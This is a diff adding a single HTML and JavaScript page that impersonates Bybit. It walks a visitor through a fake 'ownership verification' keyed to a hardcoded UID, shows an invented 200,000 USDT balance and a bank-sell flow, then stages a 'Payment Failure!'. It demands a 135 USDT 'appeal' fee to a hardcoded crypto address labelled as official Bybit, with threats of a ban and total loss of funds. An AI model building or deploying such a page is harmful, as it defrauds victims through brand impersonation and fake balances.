@@ -1,0 +1,971 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Bybit Wallet Ownership Verification</title>
+  <meta name="viewport" content="width=375, initial-scale=1.0">
+  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg-main: #16181d;
+      --bg-card: #23262f;
+      --yellow: #ffcc40;
+      --green: #1fc97a;
+      --gray: #b1b4bb;
+      --font-main: 'Segoe UI', 'Arial', 'sans-serif';
+      --border-radius: 16px;
+      --shadow: 0 2px 10px #0003;
+      --shadow-card: 0 2px 16px #0004;
+    }
+    html, body {
+      margin: 0; padding: 0;
+      background: var(--bg-main);
+      font-family: var(--font-main);
+      color: #fff;
+      width: 100vw; min-height: 100vh;
+      overflow-x: hidden;
+      font-size: 15px;
+    }
+    /* General */
+    .small-text { font-size: 0.98em; }
+    /* Container for initial section */
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding-bottom: 80px;
+    }
+    .main-image {
+      width: 92vw;
+      max-width: 350px;
+      margin-top: 38px;
+      border-radius: 20px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+      cursor: pointer;
+      transition: box-shadow 0.3s;
+    }
+    .main-image:hover {
+      box-shadow: 0 12px 44px rgba(255, 200, 60, 0.29);
+    }
+    /* Floating Button */
+    .floating-btn {
+      position: fixed;
+      right: 18px;
+      bottom: 22px;
+      z-index: 20;
+      background: var(--yellow);
+      color: #23262f;
+      font-size: 1em;
+      font-weight: 600;
+      padding: 13px 26px;
+      border: none;
+      border-radius: 32px;
+      box-shadow: 0 2px 16px rgba(255,200,60,0.35);
+      cursor: pointer;
+      transition: background 0.2s;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .floating-btn:hover {
+      background: #ffc107;
+    }
+    /* Reusable Modal (Ownership Steps, Loader) */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0; top: 0; right: 0; bottom: 0;
+      background: rgba(30,30,40,0.89);
+      align-items: center;
+      justify-content: center;
+      transition: all 0.2s;
+    }
+    .modal.active { display: flex; }
+    .modal-content {
+      background: var(--bg-card);
+      border-radius: 16px;
+      padding: 27px 18px 22px 18px;
+      min-width: 315px;
+      max-width: 91vw;
+      box-shadow: var(--shadow-card);
+      display: flex;
+      flex-direction: column;
+      gap: 17px;
+    }
+    .modal-content h2 {
+      margin: 0 0 7px 0;
+      font-size: 1.15em;
+      color: var(--yellow);
+      text-align: center;
+      font-weight: 600;
+    }
+    .modal-content label {
+      margin-bottom: 3px;
+      font-weight: 500;
+      font-size: 0.98em;
+    }
+    .modal-content input {
+      padding: 8px 13px;
+      border-radius: 7px;
+      border: 1px solid #353849;
+      background: #191B22;
+      color: #fff;
+      font-size: 0.99em;
+      margin-bottom: 8px;
+      outline: none;
+      transition: border 0.18s;
+    }
+    .modal-content input:focus {
+      border: 1.5px solid var(--yellow);
+    }
+    .modal-content button {
+      background: var(--yellow);
+      color: #222;
+      font-weight: bold;
+      border: none;
+      border-radius: 8px;
+      padding: 10px;
+      font-size: 0.97em;
+      cursor: pointer;
+      margin-top: 5px;
+      margin-bottom: 0;
+      transition: background 0.2s;
+    }
+    .modal-content button:hover {
+      background: #ffc107;
+    }
+    .error-message {
+      color: #FF4D4F;
+      text-align: center;
+      margin-top: -5px;
+      font-size: 0.95em;
+      min-height: 1.2em;
+    }
+    /* Loader Animation */
+    .loader-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 22px;
+      min-width: 240px;
+      min-height: 210px;
+      justify-content: center;
+    }
+    .bybit-spinner {
+      position: relative;
+      width: 54px;
+      height: 54px;
+      margin-bottom: 4px;
+    }
+    .bybit-spinner .circle {
+      width: 54px; height: 54px;
+      border-radius: 50%;
+      border: 5px solid var(--yellow);
+      border-top: 5px solid var(--bg-card);
+      border-right: 5px solid var(--bg-card);
+      animation: spin 1s linear infinite;
+      position: absolute;
+      top: 0; left: 0;
+      box-sizing: border-box;
+    }
+    .bybit-spinner .logo {
+      position: absolute;
+      top: 11px; left: 11px;
+      width: 32px; height: 32px;
+      background: var(--yellow);
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-weight: 600;
+      font-size: 1.2em;
+      color: var(--bg-card);
+      box-shadow: 0 2px 8px #ffcc4066;
+      letter-spacing: -2px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
+    }
+    .fetch-text {
+      color: var(--yellow);
+      font-weight: 500;
+      letter-spacing: 1px;
+      font-size: 1.05em;
+      text-align: center;
+    }
+    /* BYBIT DASHBOARD (imported section) */
+    /* All from previous dashboard code, but with smaller font and improved spacing */
+    .header {
+      background: var(--bg-main);
+      padding: 14px 10px 6px 10px;
+      position: relative;
+    }
+    .cert-bar {
+      background: var(--bg-card);
+      color: #fff;
+      border-radius: var(--border-radius);
+      display: flex;
+      align-items: center;
+      padding: 3px 10px;
+      font-size: 0.99em;
+      width: fit-content;
+      margin: 0 auto 8px auto;
+      box-shadow: var(--shadow);
+      gap: 7px;
+    }
+    .cert-check {
+      width: 14px; height: 14px;
+      background: var(--green);
+      border-radius: 50%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-size: 0.98em;
+      margin-right: 3px;
+    }
+    .cert-bar span {
+      color: #c5e9d3;
+      font-size: 0.97em;
+      font-weight: 500;
+      margin-left: 1px;
+    }
+    .qr-btn {
+      position: absolute;
+      top: 14px;
+      right: 14px;
+      width: 28px;
+      height: 28px;
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 0;
+    }
+    .qr-btn svg {
+      width: 24px;
+      height: 24px;
+      fill: #fff;
+      opacity: 0.7;
+    }
+    .top-assets {
+      display: flex;
+      align-items: flex-start;
+      justify-content: space-between;
+      padding: 7px 10px 0 10px;
+    }
+    .assets-info { flex-direction: column; gap: 5px; display: flex;}
+    .assets-title {
+      color: var(--gray);
+      font-size: 0.98em;
+      display: flex;
+      align-items: center;
+      gap: 2.5px;
+      font-weight: 400;
+    }
+    .assets-title svg {
+      width: 15px; height: 15px;
+      vertical-align: -2px;
+      fill: var(--gray);
+      opacity: 0.7;
+    }
+    .assets-balance {
+      font-size: 1.38em;
+      font-weight: 600;
+      letter-spacing: 0.5px;
+      line-height: 1.1em;
+      margin-bottom: 2px;
+    }
+    .assets-usd {
+      font-size: 0.99em;
+      margin-left: 4px;
+      font-weight: 400;
+    }
+    .assets-btc {
+      color: var(--gray);
+      font-size: 0.94em;
+      margin-top: 1px;
+    }
+    .deposit-btn {
+      background: var(--yellow);
+      color: #222;
+      font-weight: 600;
+      padding: 9px 22px;
+      border: none;
+      border-radius: 8px;
+      font-size: 1em;
+      cursor: pointer;
+      margin-top: 2px;
+      transition: background 0.2s;
+      box-shadow: 0 2px 10px #ffcc4080;
+    }
+    .deposit-btn:hover, .deposit-btn:focus { background: #ffd966; }
+    .p2p-section {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin: 13px 0 8px 0;
+    }
+    .p2p-icon-bg {
+      width: 36px;
+      height: 36px;
+      background: var(--bg-card);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 5px;
+      box-shadow: 0 2px 8px #0002;
+    }
+    .p2p-icon {
+      width: 26px;
+      height: 26px;
+      background: var(--yellow);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--bg-card);
+      font-weight: bold;
+      font-size: 1.13em;
+      box-shadow: 0 2px 8px #ffcc4060;
+    }
+    .p2p-label {
+      color: #fff;
+      font-size: 0.98em;
+      font-weight: 400;
+      text-align: center;
+      margin-top: 1px;
+      letter-spacing: 0.5px;
+    }
+    .verification-card {
+      background: #fff;
+      color: #16181d;
+      border-radius: 8px;
+      max-width: 90vw;
+      margin: 13px auto 16px auto;
+      box-shadow: var(--shadow-card);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 22px 0 15px 0;
+      font-size: 1.05em;
+    }
+    .verification-check {
+      color: var(--green);
+      font-size: 2.1em;
+      margin-bottom: 10px;
+    }
+    .verification-msg {
+      font-weight: 500;
+      font-size: 1em;
+    }
+    .trading-section {
+      margin: 0 0 17px 0;
+      padding: 0 7px;
+    }
+    .trading-tabs {
+      display: flex;
+      gap: 11px;
+      font-size: 0.99em;
+      font-weight: 500;
+      margin-bottom: 7px;
+      padding-left: 1px;
+    }
+    .trading-tab-active {
+      color: var(--yellow);
+      border-bottom: 2px solid var(--yellow);
+      padding-bottom: 3px;
+    }
+    .trading-tab-inactive {
+      color: #888;
+      padding-bottom: 3px;
+    }
+    .trading-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 11px;
+    }
+    .trade-card {
+      background: var(--bg-card);
+      border-radius: 9px;
+      padding: 11px 7px 9px 10px;
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+      box-shadow: 0 2px 10px #0002;
+      min-width: 0;
+    }
+    .trade-title {
+      color: #fff;
+      font-size: 1.01em;
+      font-weight: 500;
+      letter-spacing: 0.23px;
+    }
+    .trade-tick {
+      color: var(--yellow); 
+      font-size: 1.01em; 
+      margin-left: 3px;
+      vertical-align: 1px;
+    }
+    .trade-value-row {
+      display: flex;
+      align-items: baseline;
+      gap: 6px;
+    }
+    .trade-value {
+      font-size: 0.99em;
+      font-weight: 600;
+      margin-top: 1px;
+    }
+    .trade-change-up {
+      color: var(--green);
+      font-size: 0.93em;
+      font-weight: 500;
+      margin-left: 1px;
+    }
+    .trade-change-down {
+      color: #f44336;
+      font-size: 0.93em;
+      font-weight: 500;
+      margin-left: 1px;
+    }
+    .bottom-nav {
+      background: var(--bg-card);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: fixed;
+      bottom: 0; left: 0; right: 0;
+      height: 54px;
+      box-shadow: 0 -2px 10px #0002;
+      z-index: 20;
+    }
+    .nav-btn {
+      flex: 1 1 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 2px;
+      color: #888;
+      font-size: 0.97em;
+      font-weight: 500;
+      padding: 8px 0 0 0;
+      border: none;
+      background: none;
+      cursor: pointer;
+      transition: color 0.18s;
+    }
+    .nav-btn-active { color: var(--yellow); }
+    .nav-btn svg {
+      width: 22px; height: 22px;
+      margin-bottom: 2px;
+    }
+    /* Dashboard Asset Page */
+    #assets-section img {
+      width: 70px; max-width: 36vw; box-shadow: 0 2px 12px #0003; border-radius: 50%;
+    }
+    #assets-section > div { font-size: 0.95em; }
+    /* Modal Styles for Dashboard Modals */
+    .modal-mask {
+      display:none;
+      position: fixed;
+      top: 0; left: 0; width: 100vw; height: 100vh;
+      background: #16181de0;
+      z-index: 2000;
+      align-items: center;
+      justify-content: center;
+      overflow-y: auto;
+    }
+    .modal-mask.show { display: flex; }
+    .modal-card {
+      background: #fff;
+      color: #16181d;
+      border-radius: 12px;
+      max-width: 350px;
+      width: 93vw;
+      margin: 0 auto;
+      padding: 20px 14px 18px 14px;
+      box-shadow: var(--shadow-card);
+      text-align: left;
+      position: relative;
+      animation: modalIn 0.2s;
+      font-size: 0.97em;
+    }
+    @keyframes modalIn {
+      from { transform: translateY(40px) scale(0.98); opacity: 0; }
+      to { transform: translateY(0) scale(1); opacity: 1; }
+    }
+    .modal-close {
+      position: absolute;
+      top: 11px;
+      right: 13px;
+      font-size: 1.2em;
+      color: #aaa;
+      background: none;
+      border: none;
+      cursor: pointer;
+      padding: 0;
+      line-height: 1;
+      transition: color 0.15s;
+    }
+    .modal-close:hover { color: #16181d; }
+    .modal-card label {
+      font-size: 0.97em;
+      color: #2b2b2b;
+      margin-bottom: 2px;
+      display: block;
+      font-weight: 500;
+      margin-top: 7px;
+    }
+    .modal-card input, .modal-card select {
+      width: 100%;
+      padding: 7px;
+      margin: 3px 0 6px 0;
+      border-radius: 6px;
+      border: 1px solid #e3e3e8;
+      background: #f7f7fa;
+      font-size: 0.96em;
+      color: #2b2b2b;
+    }
+    .modal-card input[readonly] {
+      background: #e4e4e7;
+      color: #16181d;
+      font-weight: 600;
+      border: none;
+    }
+    .modal-btn { width: 100%; margin-top: 12px;}
+    .modal-note {
+      color: #87898e;
+      font-size: 0.93em;
+      margin-bottom: 5px;
+    }
+    .modal-copy-row {
+      background: #f7f7fa; color: #23262f; padding: 7px 9px;
+      border-radius: 6px; display: flex; align-items: center; justify-content: space-between;
+      margin: 5px 0 8px 0; font-size: 0.95em; user-select: all;
+    }
+    .copy-btn {
+      padding: 2px 8px;
+      font-size: 0.95em;
+      border-radius: 5px;
+      background: var(--yellow);
+      color: #16181d;
+      border: none;
+      cursor: pointer;
+      margin-left: 5px;
+      transition: background 0.2s;
+    }
+    .copy-btn:active { background: #ffd966;}
+    .modal-warning {
+      color: #f44336;
+      font-size: 0.95em;
+      font-weight: 500;
+      margin-top: 8px;
+    }
+    .custom-file {
+      background: #f7f7fa;
+      border-radius: 8px;
+      padding: 9px;
+      margin: 7px 0;
+      text-align: center;
+      color: #777;
+      font-size: 0.95em;
+      cursor: pointer;
+      border: 1px dashed #b1b4bb;
+      transition: border 0.15s;
+    }
+    .custom-file:hover { border: 1px solid var(--yellow);}
+    .file-name { font-size: 0.92em; color: #333; margin-top: 4px; font-weight: 500;}
+
+    @media (max-width: 500px) {
+      .main-image { max-width: 90vw;}
+      .modal-content, .dashboard, .loader-container, .modal-card { min-width: 91vw;}
+      .bybit-spinner, .bybit-spinner .circle { width: 44px; height: 44px;}
+      .bybit-spinner .logo { top: 7px; left: 7px; width: 24px; height: 24px; font-size: 1em;}
+    }
+  </style>
+</head>
+<body>
+  <!-- Initial Ownership Verification Section -->
+  <div class="container" id="ownership-section">
+    <img src="IMG_4058.jpeg" alt="Main Content" class="main-image" id="mainImage">
+    <div class="small-text" style="margin-top:20px;text-align:center;max-width:350px;opacity:0.92;">
+      <b>Welcome!</b> To continue, verify ownership of this Bybit wallet. Click below to start.
+    </div>
+  </div>
+  <!-- Floating Button -->
+  <button class="floating-btn" id="dashboardBtn">
+    <span>Begin Verification</span>
+  </button>
+  <!-- Modal for Verification Steps -->
+  <div class="modal" id="modal">
+    <div class="modal-content" id="modalContent">
+      <!-- Dynamic content loaded here -->
+    </div>
+  </div>
+  <!-- =================== DASHBOARD SECTION (hidden until verified) =================== -->
+  <div id="dashboard-root" style="display:none;">
+    <div id="home-section">
+      <div class="header">
+        <div class="cert-bar">
+          <span class="cert-check">
+            <svg width="12" height="12" viewBox="0 0 12 12"><circle cx="6" cy="6" r="6" fill="#1fc97a"/><polyline points="3,7 5,9 9,4" fill="none" stroke="#fff" stroke-width="1.5"/></svg>
+          </span>
+          <span>This certificate is valid</span>
+        </div>
+        <button class="qr-btn" title="QR">
+          <svg viewBox="0 0 24 24"><rect x="2" y="2" width="7" height="7" rx="2"/><rect x="15" y="2" width="7" height="7" rx="2"/><rect x="2" y="15" width="7" height="7" rx="2"/><rect x="17" y="17" width="3" height="3" rx="1.2"/></svg>
+        </button>
+      </div>
+      <div class="top-assets">
+        <div class="assets-info">
+          <div class="assets-title">
+            Total Assets
+            <svg width="15" height="15" viewBox="0 0 20 20"><circle cx="10" cy="10" r="8" fill="#b1b4bb"/><ellipse cx="10" cy="10" rx="2" ry="2.5" fill="#16181d"/></svg>
+          </div>
+          <div class="assets-balance">
+            200,000.00 
+            <span class="assets-usd">USDT ▼</span>
+          </div>
+          <div class="assets-btc">≈ 1.69992182 BTC</div>
+        </div>
+        <button class="deposit-btn">Deposit</button>
+      </div>
+      <div class="p2p-section">
+        <div class="p2p-icon-bg">
+          <div class="p2p-icon" id="home-p2p-btn" title="Sell USDT P2P">
+            <svg viewBox="0 0 28 28" width="19" height="19"><circle cx="14" cy="14" r="14" fill="#ffcc40"/><path d="M9 15v-2a5 5 0 0 1 10 0v2" stroke="#23262f" stroke-width="2" fill="none"/><path d="M14 11v4" stroke="#23262f" stroke-width="2" stroke-linecap="round"/></svg>
+          </div>
+        </div>
+        <div class="p2p-label">P2P Trading</div>
+      </div>
+      <div class="verification-card">
+        <div class="verification-check">✔</div>
+        <div class="verification-msg">Verification complete!</div>
+      </div>
+      <div class="trading-section">
+        <div class="trading-tabs">
+          <div class="trading-tab-active">Spot</div>
+          <div class="trading-tab-inactive">Derivatives</div>
+        </div>
+        <div class="trading-grid">
+          <div class="trade-card">
+            <div class="trade-title">
+              BTC/USDT <span class="trade-tick">✔</span>
+            </div>
+            <div class="trade-value-row">
+              <div class="trade-value">117,719.6</div>
+              <div class="trade-change-up">+1.16%</div>
+            </div>
+          </div>
+          <div class="trade-card">
+            <div class="trade-title">
+              SOL/USDT <span class="trade-tick">✔</span>
+            </div>
+            <div class="trade-value-row">
+              <div class="trade-value">163.58</div>
+              <div class="trade-change-down">-0.79%</div>
+            </div>
+          </div>
+          <div class="trade-card">
+            <div class="trade-title">
+              ETH/USDT <span class="trade-tick">✔</span>
+            </div>
+            <div class="trade-value-row">
+              <div class="trade-value">2,967.92</div>
+              <div class="trade-change-up">+0.22%</div>
+            </div>
+          </div>
+          <div class="trade-card">
+            <div class="trade-title">
+              XRP/USDT <span class="trade-tick">✔</span>
+            </div>
+            <div class="trade-value-row">
+              <div class="trade-value">2.8201</div>
+              <div class="trade-change-up">+9.12%</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <!-- Assets Section (hidden by default) -->
+    <div id="assets-section" style="display:none;">
+      <div style="text-align:center;margin:22px 0 8px 0;">
+        <img src="https://cryptologos.cc/logos/bybit-bybit-logo.png?v=036" alt="Assets"/>
+        <div style="font-size:1.05em;color:var(--yellow);font-weight:600;margin-top:7px;">ASSETS</div>
+      </div>
+      <button id="assets-p2p-btn" class="deposit-btn" style="margin:20px auto 0 auto;display:block;">P2P</button>
+    </div>
+    <!-- Bottom Nav -->
+    <div class="bottom-nav">
+      <button class="nav-btn nav-btn-active" id="nav-home">
+        <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="10" rx="2" fill="#ffcc40"/><rect x="9" y="7" width="6" height="4" rx="1.5" fill="#ffcc40"/><rect x="7" y="3" width="10" height="4" rx="2" fill="#ffcc40"/></svg>
+        Home
+      </button>
+      <button class="nav-btn" id="nav-assets">
+        <svg viewBox="0 0 24 24"><rect x="4" y="6" width="16" height="12" rx="2" fill="#fff"/><rect x="8" y="10" width="8" height="4" rx="1" fill="#23262f"/></svg>
+        Assets
+      </button>
+    </div>
+    <!-- P2P Sell Modal -->
+    <div class="modal-mask" id="p2p-modal">
+      <div class="modal-card" id="p2p-modal-card">
+        <button class="modal-close" aria-label="Close" id="close-p2p-modal">&times;</button>
+        <h2>Sell USDT to Bank</h2>
+        <form id="p2p-sell-form" autocomplete="off">
+          <label>Amount</label>
+          <input type="text" value="200,000" readonly />
+          <div class="modal-note">USDT</div>
+          <label>Bank</label>
+          <select id="bank-select" required></select>
+          <label>Account Number</label>
+          <input id="bank-account" maxlength="20" type="text" placeholder="Enter Account Number" autocomplete="off" required pattern="^\d{6,20}$"/>
+          <button type="submit" class="deposit-btn modal-btn">Confirm</button>
+        </form>
+      </div>
+    </div>
+    <!-- Sell Review Modal -->
+    <div class="modal-mask" id="sell-review-modal">
+      <div class="modal-card">
+        <button class="modal-close" aria-label="Close" id="close-sell-review">&times;</button>
+        <h2>Review Sell Order</h2>
+        <div id="review-details"></div>
+        <div style="display:flex;align-items:center;margin:10px 0 6px 0;">
+          <input type="checkbox" id="review-tick" style="accent-color:#ffcc40;margin-right:7px;width:1.1em;height:1.1em;"/>
+          <label for="review-tick" style="font-size:0.97em;user-select:none;cursor:pointer;">I confirm this sell order</label>
+        </div>
+        <button class="deposit-btn modal-btn" id="place-sell-order">Place Sell Order</button>
+      </div>
+    </div>
+    <!-- Awaiting Order Modal -->
+    <div class="modal-mask" id="awaiting-order-modal">
+      <div class="modal-card" id="awaiting-content">
+        <!-- JS fills content -->
+      </div>
+    </div>
+  </div>
+  <script>
+    // ---------------------- Ownership Verification Steps --------------------
+    const dashboardBtn = document.getElementById('dashboardBtn');
+    const modal = document.getElementById('modal');
+    const modalContent = document.getElementById('modalContent');
+    let userCountry = 'Australia 🇦🇺', userName = '', userUID = '', verificationPassed = false;
+
+    function showCountryStep() {
+      modalContent.innerHTML = `
+        <h2>Confirm Your Country</h2>
+        <div style="font-size:1.2em;text-align:center;margin:12px 0 17px 0;">${userCountry}</div>
+        <button onclick="proceedToName()" style="margin-top:6px;font-size:0.97em;">Confirm</button>
+      `;
+    }
+    function showNameUidStep(error = "") {
+      modalContent.innerHTML = `
+        <h2>Ownership Verification</h2>
+        <label for="nameInput">Full Name</label>
+        <input id="nameInput" type="text" maxlength="50" placeholder="Enter your full name" value="${userName}">
+        <label for="uidInput">UID</label>
+        <input id="uidInput" type="number" maxlength="12" placeholder="Enter your UID" value="${userUID}">
+        <span class="error-message">${error}</span>
+        <button onclick="checkNameUid()" style="font-size:0.97em;">Retrieve Pending Transaction</button>
+      `;
+      setTimeout(() => { document.getElementById('nameInput').focus(); }, 80);
+    }
+    function showLoader() {
+      modalContent.innerHTML = `
+        <div class="loader-container">
+          <div class="bybit-spinner">
+            <div class="circle"></div>
+            <div class="logo"><span>B</span></div>
+          </div>
+          <div class="fetch-text">FETCHING TRANSACTION DATA</div>
+        </div>
+      `;
+    }
+    function showDashboardRoot() {
+      document.getElementById('ownership-section').style.display = 'none';
+      dashboardBtn.style.display = 'none';
+      document.getElementById('dashboard-root').style.display = '';
+      window.scrollTo(0,0);
+    }
+    window.proceedToName = function() { showNameUidStep(); };
+    window.checkNameUid = function() {
+      const nameInput = document.getElementById('nameInput').value.trim();
+      const uidInput = document.getElementById('uidInput').value.trim();
+      if (!nameInput) { showNameUidStep("Please enter your full name."); return; }
+      if (uidInput !== "431775015") { showNameUidStep("Invalid UID. Ownership verification failed."); return; }
+      userName = nameInput;
+      userUID = uidInput;
+      verificationPassed = true;
+      showLoader();
+      setTimeout(() => { modal.classList.remove('active'); showDashboardRoot(); }, 2000);
+    };
+    dashboardBtn.onclick = () => { modal.classList.add('active'); showCountryStep(); };
+    modal.onclick = function(e){
+      if (e.target === modal) {
+        modal.classList.remove('active');
+        verificationPassed = false;
+        userName = '';
+        userUID = '';
+      }
+    };
+    document.getElementById('mainImage').onclick = () => { dashboardBtn.click(); };
+
+    // ---------------------- Dashboard Section JS (P2P etc) -----------------
+    // Hide dashboard-root until verified
+    document.getElementById('dashboard-root').style.display = 'none';
+
+    // Section Switch
+    function showSection(section) {
+      document.getElementById('home-section').style.display = section === 'home' ? '' : 'none';
+      document.getElementById('assets-section').style.display = section === 'assets' ? '' : 'none';
+      document.getElementById('nav-home').classList.toggle('nav-btn-active', section === 'home');
+      document.getElementById('nav-assets').classList.toggle('nav-btn-active', section === 'assets');
+    }
+    document.getElementById('nav-home').onclick = () => showSection('home');
+    document.getElementById('nav-assets').onclick = () => showSection('assets');
+
+    // Bank List
+    const topBanks = [
+      "Commonwealth Bank", "Westpac", "ANZ", "NAB", "Macquarie Bank", "Bendigo Bank", "ING", "Suncorp", 
+      "Bank of Queensland", "AMP Bank", "Bankwest", "ME Bank", "Heritage Bank", "Greater Bank", 
+      "People's Choice", "BankSA", "Bank of Melbourne", "Citi", "HSBC", "Rabobank", "PN BANK", "UP BANK"
+    ];
+    function populateBanks() {
+      const select = document.getElementById('bank-select');
+      select.innerHTML = topBanks.map(b => `<option value="${b}">${b}</option>`).join('');
+    }
+    populateBanks();
+    // P2P Modal Openers (home and assets)
+    document.getElementById('home-p2p-btn').onclick = () => openP2PModal();
+    document.getElementById('assets-p2p-btn').onclick = () => openP2PModal();
+    function openP2PModal() {
+      document.getElementById('p2p-modal').classList.add('show');
+      document.getElementById('bank-account').value = '';
+      document.getElementById('bank-select').selectedIndex = 0;
+    }
+    // Close buttons
+    document.getElementById('close-p2p-modal').onclick = () => {
+      document.getElementById('p2p-modal').classList.remove('show');
+    };
+    document.getElementById('close-sell-review').onclick = () => {
+      document.getElementById('sell-review-modal').classList.remove('show');
+    };
+    // P2P Sell Form Submit
+    document.getElementById('p2p-sell-form').onsubmit = (e) => {
+      e.preventDefault();
+      const bank = document.getElementById('bank-select').value;
+      const acc = document.getElementById('bank-account').value.trim();
+      if (!bank || !acc.match(/^\d{6,20}$/)) {
+        alert("Please select a bank and enter a valid account number.");
+        return false;
+      }
+      document.getElementById('p2p-modal').classList.remove('show');
+      showSellReview(bank, acc);
+      return false;
+    };
+    // Sell Review Modal
+    function showSellReview(bank, acc) {
+      let rate = "A$306,000";
+      document.getElementById('review-details').innerHTML = `
+        <div style="margin-bottom:6px;">Dear Bybit User, you are about to <b>Sell 200,000 USDT</b> to:<br><b>${bank}</b><br>Account: <b>${acc}</b></div>
+        <div style="margin-bottom:5px;">P2P Sell Rate: <b>200,000 USDT</b> ≈ <b>${rate}</b></div>
+      `;
+      document.getElementById('review-tick').checked = false;
+      document.getElementById('sell-review-modal').classList.add('show');
+      document.getElementById('place-sell-order').onclick = function() {
+        if (!document.getElementById('review-tick').checked) {
+          alert("Please confirm the sell order by ticking the checkbox.");
+          return;
+        }
+        document.getElementById('sell-review-modal').classList.remove('show');
+        showAwaitingOrder(bank, acc);
+      };
+    }
+    // Awaiting Order Modal
+    function showAwaitingOrder(bank, acc) {
+      let rate = "A$306,000";
+      const awaiting = document.getElementById('awaiting-content');
+      document.getElementById('awaiting-order-modal').classList.add('show');
+      awaiting.innerHTML = `
+        <h2>AWAITING ORDER</h2>
+        <div style="margin-bottom:8px;">
+          <b>${rate}</b> would be credited to <br><b>${bank}</b><br>Account: <b>${acc}</b>
+        </div>
+        <div class="modal-note">
+          P2P BUY/SELL does not take more than 30 minutes.
+        </div>
+      `;
+      setTimeout(() => {
+        showAppeal(bank, acc, rate);
+      }, 9000);
+    }
+    // Appeal Modal
+    function showAppeal(bank, acc, rate) {
+      const awaiting = document.getElementById('awaiting-content');
+      awaiting.innerHTML = `
+        <div style="color:#f44336;font-weight:600;margin-bottom:10px;">Payment Failure!</div>
+        <div style="margin-bottom:7px;">
+          Due to <b>BYBIT P2P MARKET SECURITY</b>, a payment of <b>135 USDT</b> is needed to appeal.<br>
+          Send <b>135 USDT</b> to this official verified Bybit address:
+        </div>
+        <div class="modal-copy-row">
+          <span id="bybit-address">TY4SpRKLhXgo6KjxmbjK5CBEUhP74WbYAa</span>
+          <button class="copy-btn" id="copy-bybit-address">Copy</button>
+        </div>
+        <div class="modal-note">Upload payment screenshot below</div>
+        <label for="payment-screenshot" class="custom-file" id="file-label">
+          <span id="file-label-text">Click to upload screenshot</span>
+          <input type="file" id="payment-screenshot" accept="image/*" style="display:none;"/>
+        </label>
+        <button class="deposit-btn modal-btn" id="paid-btn">I have paid</button>
+        <div class="modal-warning">
+          Do not click until payment is made or your UID (<b>431775015</b>) will be banned and it may lead to total loss of funds.
+        </div>
+      `;
+      document.getElementById('copy-bybit-address').onclick = function() {
+        const text = document.getElementById('bybit-address').innerText;
+        navigator.clipboard.writeText(text);
+        this.innerText = "Copied!";
+        setTimeout(() => this.innerText = "Copy", 1400);
+      };
+      const fileInput = document.getElementById('payment-screenshot');
+      fileInput.onchange = function() {
+        if (fileInput.files.length) {
+          document.getElementById('file-label-text').innerText = "Uploaded: " + fileInput.files[0].name;
+        } else {
+          document.getElementById('file-label-text').innerText = "Click to upload screenshot";
+        }
+      };
+      document.getElementById('paid-btn').onclick = function() {
+        if (!fileInput.files.length) {
+          alert("Please upload your payment screenshot.");
+          return;
+        }
+        awaiting.innerHTML = `
+          <h2>Order Submitted</h2>
+          <div style="margin-bottom:7px;">
+            Your payment has been received and your <b>Sell Order</b> is being processed.<br>
+            <b>${rate}</b> will be credited to:<br><b>${bank}</b><br>Account: <b>${acc}</b>
+          </div>
+          <div class="modal-note" style="font-size:1em;">
+            Thank you for using Bybit P2P. You can close this window.
+          </div>
+          <button class="deposit-btn modal-btn" id="close-awaiting">Close</button>
+        `;
+        document.getElementById('close-awaiting').onclick = () => {
+          document.getElementById('awaiting-order-modal').classList.remove('show');
+        };
+      };
+    }
+    // Dashboard Modal backdrop close
+    document.querySelectorAll('.modal-mask').forEach(mask => {
+      mask.addEventListener('mousedown', function(e) {
+        if (e.target === mask) mask.classList.remove('show');
+      });
+    });
+  </script>
+</body>
+</html>
